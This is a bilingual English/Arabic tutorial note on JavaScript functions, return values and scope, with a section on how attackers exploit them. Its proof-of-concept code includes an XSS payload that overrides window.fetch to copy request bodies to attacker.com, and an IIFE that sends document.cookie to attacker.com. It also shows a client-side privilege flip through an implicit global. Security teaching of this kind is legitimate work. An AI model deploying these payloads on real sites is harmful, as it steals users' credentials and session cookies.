6. Functions, Scopes & Return Values in JavaScript

Functions:
Reusable blocks of code designed to perform a specific task when invoked (called).

Syntax & Return Values:
function checkScore(input) {
    if (input > 60) {
        return "Pass";
    } else {
        return "Fail";
    }
}

// Function Calling:
checkScore(75); // Returns "Pass"

Undefined Return Value:
- If a function does not contain a `return` statement, it executes its inner code but implicitly returns `undefined`.

Scope Concepts:
1. Global Scope:
   - Variables declared outside any function can be accessed anywhere.
   - Accidental Global (Implicit Global): Assigning a value to an undeclared variable inside a function (e.g., `oopsGlobal = 5;`) automatically attaches it to the Global Scope (`window`).

2. Local Scope:
   - Variables declared inside a function (using `let`, `const`, or `var`) are local to that function.
   - Accessing a local variable outside its function results in a `ReferenceError`.


---

### (JS Core Concept)

الدوال (**Functions**) ونطاقات المتغيرات (**Scopes**) هي أساس بناء أي تطبيق في الجافاسكريبت.

- **الدالة (Function):** كود برمجى بيجمع خطوات معينة ويديهم اسم، عشان تقدر تنفذهم في أي وقت بـ Call بسيط بدل ما تكرر نفس الأوامر.
    
- **إرجاع القيم (`return` vs `undefined`):**
    
    - كلمة `return` بتحدد الناتج النهائى اللي بترجعه الدالة للمكان اللي استدعاها.
        
    - لو نسيت تكتب `return` جوه الدالة، الدالة هتنقذ الأوامر عادي، لكن ناتجها النهائي هيكون `undefined` تلقائياً.
        
- **النطاق المحترس (Local Scope):** المتغير المعرف جوه الدالة بـ `let` أو `const` بيبقى محبوس جوه الدالة دي، ومحدش يقدر يشوفه من بره.
    
- **خطأ النطاق العام الضمني (Implicit Global Error):** لو نسيت تكتب `let` أو `const` وأنت بتعرف متغير جوه دالة (زي `oopsGlobal = 5`), الجافاسكريبت هتعمله Promote وترميه في الـ **Global Scope**!
    

### 3. 💻 مثال برمجي تقليدي (Standard Example)

JavaScript

```
// Function with explicit return
function calculateGrade(score) {
    if (score >= 50) return "Passed";
    return "Failed";
}

// Function without return (returns undefined)
let total = 0;
function addPoints(pts) {
    total += pts; // Modifies outer variable, but returns undefined
}

// Local vs Global Scope Demonstration
let globalVar = "I am Global";

function scopeTest() {
    let localVar = "I am Local";
    oopsGlobal = "I escaped to Global!"; // Oops! Implicit Global
}

scopeTest();

console.log(globalVar);   // Output: "I am Global"
console.log(oopsGlobal);  // Output: "I escaped to Global!"
// console.log(localVar); // Throws Uncaught ReferenceError: localVar is not defined
```

### 4. ⚔️ منظور الهكر (JS for Hackers)

الدوال ونطاقات الـ Scope مش مجرد تنظيم للكود، دي من أهم الطرق اللي الهكر بيستغلها أو بيحمي بيها الكود الهجومي بتاعه:

1. **الوقوع في ثغرة الـ Implicit Globals (`oopsGlobal` Pollution):**
    
    - لما المطور ينسى كلمة `let` أو `const` جوه دالة، المتغير بيتربط بـ `window` مباشرة.
        
    - المهاجم يقدر يستغل المتغير ده لو كان بيمثل شرط أمان، أو يلوثه لتغيير سلوك التطبيق بالكامل (Global Variable Pollution).
        
2. **تعديل واستبدال الدوال الأصلية (Function Overriding / Monkey Patching):**
    
    - في JS، الدوال عبارة عن **First-Class Objects**. يعني تقدر تغير وظيفة أي دالة في الموقع!
        
    - لو المهاجم عنده DOM XSS، يقدر يستبدل دالة إرسال الـ API مثل `window.fetch` أو دالة الفحص `validateAuth()` بدالة هجومية تسرق البيانات قبل تسليمها للموقع.
        
3. **عزل الـ Payloads بـ IIFE (Immediately Invoked Function Expression):**
    
    - الهكر الذكي مش بيحقن كود في الـ Global Scope عشان ما يضربش متغيراً في الموقع أو يخلي الـ Console يطلع Errors تتفضح.
        
    - المهاجمين بيغلفوا الـ XSS Payloads جوه **IIFE** عشان تعمل Local Scope خاص بيها وتتنفذ فوراً في صمت.
        
4. **تجاوز الفحوصات بسبب ناتج الـ `undefined`:**
    
    - لو دالة حماية أو فحص أذونات مفيهاش `return` صريح، ناتج تنفيذها بيبقى `undefined`.
        
    - المقارنات الضعيفة زي `if (checkAuth() == false)` هتفشل لو الدالة رجعت `undefined` بدل `false` صريحة، وده بيسمح بتجاوز الفحص (Logic Flaw)!
        

### 5. 🎯 أمثلة هجومية وسيناريوهات استغلال (PoC & Payloads)

#### 📌 السيناريو الأول: اعتراض وتجسس على الطلبات الموجهة عبر الـ Function Overriding

تخيل موقع بيسجل دخول المستخدم أو بيبعت كارت البنك.. المهاجم بحقنة XSS بيعيد تعريف دالة `fetch` الأصلية الخاصة بالمتصفح:

JavaScript

```
// حفظ الدالة الأصلية
const originalFetch = window.fetch;

// استبدال الدالة الأصلية بدالة هجومية (Monkey Patching)
window.fetch = function(...args) {
    console.log("Hacker Intercepted Data:", args[1].body);
    
    // إرسال نسخة من البيانات لسيرفر المهاجم
    new Image().src = "https://attacker.com/steal?data=" + encodeURIComponent(args[1].body);
    
    // تنفيذ الطلب الأصلي عشان الضحية ما يشكش في حاجة
    return originalFetch.apply(this, args);
};
```

#### 📌 السيناريو الثاني: كتابة Payload معزول هجومياً بـ IIFE تجنباً للـ Errors

تغليف الكود الهجومي جوه Local Scope خاص بيه لمنع التداخل مع المتغيرات الأصلية للموقع:

JavaScript

```
// كتابة IIFE: دالة مجهولة بتتنفذ فوراً في نطاق محلي مغلق
(function() {
    // كل المتغيرات هنا Local ومستحيل تعمل Error في الـ Global Scope بتاع الموقع
    let stolenCookie = document.cookie;
    let exfilUrl = "https://attacker.com/log?c=" + encodeURIComponent(stolenCookie);
    
    fetch(exfilUrl, { mode: 'no-cors' });
})();
```

#### 📌 السيناريو الثالث: التلاعب بـ Implicit Global (`oopsGlobal`) لكسر المنطق

تخيل كود المطور جوه دالة تسجيل الدخول نسى فيه إعلان المتغير:

JavaScript

```
// كود تطبيق قديم
function processLogin(user) {
    if (user.isAdmin) {
        isSystemAdmin = true; // Oops! لم يتم كتابة let أو var (Implicit Global)
    }
}
```

- **طريقة الاستغلال:** `isSystemAdmin` بقت ملك للجميع في الـ `window`! المهاجم يقدر يكتب في الـ Console أو عبر الحقن:
    
    JavaScript
    
    ```
    window.isSystemAdmin = true; // الآن الهكر أخذ صلاحيات الآدمين في بقية أجزاء الموقع!
    ```
